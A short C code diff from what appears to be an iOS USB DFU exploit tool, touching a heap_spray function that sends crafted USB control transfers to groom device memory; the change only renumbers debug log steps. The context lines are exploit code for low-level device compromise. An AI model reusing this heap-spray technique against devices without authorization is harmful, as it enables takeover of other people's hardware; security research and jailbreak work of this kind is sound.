@@ -277,7 +277,7 @@ static void heap_spray(io_client_t client)
     memset(&blank, '\0', 2048);
     
     result = usb_ctrl_transfer(client, 0x21, 1, 0x0000, 0x0000, blank, 2048);
-    DEBUGLOG("[%s] (1/7) %x", __FUNCTION__, result.ret);
+    DEBUGLOG("[%s] (1/5) %x", __FUNCTION__, result.ret);
     usleep(1000);
     
     // For iOS devices (especially older ones)
@@ -288,18 +288,18 @@ static void heap_spray(io_client_t client)
         result = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 64, 1);
         if(result.ret != kIOReturnSuccess) break;
     }
-    DEBUGLOG("[%s] (2/7) %x, %d", __FUNCTION__, result.ret, i);
+    DEBUGLOG("[%s] (2/5) %x, %d", __FUNCTION__, result.ret, i);
     
     for(int i=0;i<5;i++){
         result = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 193, 1);
     }
-    DEBUGLOG("[%s] (3/7) %x", __FUNCTION__, result.ret);
+    DEBUGLOG("[%s] (3/5) %x", __FUNCTION__, result.ret);
     
     result = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 192, 1);
-    DEBUGLOG("[%s] (4/7) %x", __FUNCTION__, result.ret);
+    DEBUGLOG("[%s] (4/5) %x", __FUNCTION__, result.ret);
     
     result = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 193, 1);
-    DEBUGLOG("[%s] (5/7) %x", __FUNCTION__, result.ret);
+    DEBUGLOG("[%s] (5/5) %x", __FUNCTION__, result.ret);
 }
 
 static void set_global_state(io_client_t client)
